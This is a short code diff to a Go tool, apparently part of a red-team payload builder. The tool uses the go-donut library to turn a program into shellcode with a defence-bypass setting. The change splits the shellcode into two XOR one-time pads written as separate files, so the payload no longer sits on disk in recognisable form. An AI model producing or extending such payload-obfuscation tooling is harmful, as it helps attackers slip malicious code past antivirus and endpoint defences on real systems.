@@ -6,10 +6,12 @@ import (
 	"flag"
 	"fmt"
 	"io/ioutil"
+	"math/rand"
 	"net/http"
 	"os"
 	"path"
 	"runtime"
+	"time"
 
 	"github.com/Binject/go-donut/donut"
 )
@@ -31,7 +33,7 @@ func init() {
 		os.Exit(0)
 	}
 
-	flag.StringVar(&outputPath, "o", "", "where to put the output ASM file")
+	flag.StringVar(&outputPath, "o", "", "where to put the pads")
 	flag.Parse()
 	if len(outputPath) < 1 {
 		flag.Usage()
@@ -76,5 +78,14 @@ func main() {
 		Bypass:   3,
 	})
 
-	checkFatalErr(ioutil.WriteFile(path.Join(outputPath, "payload"), shellcode.Bytes(), 0777))
+	pad1 := make([]byte, len(shellcode.Bytes()))
+	pad2 := make([]byte, len(shellcode.Bytes()))
+	rand.Seed(time.Now().UnixNano())
+	for index, shellcodeByte := range shellcode.Bytes() {
+		pad1[index] = byte(rand.Int())
+		pad2[index] = pad1[index] ^ shellcodeByte
+	}
+
+	checkFatalErr(ioutil.WriteFile(path.Join(outputPath, "pad1"), pad1, 0777))
+	checkFatalErr(ioutil.WriteFile(path.Join(outputPath, "pad2"), pad2, 0777))
 }
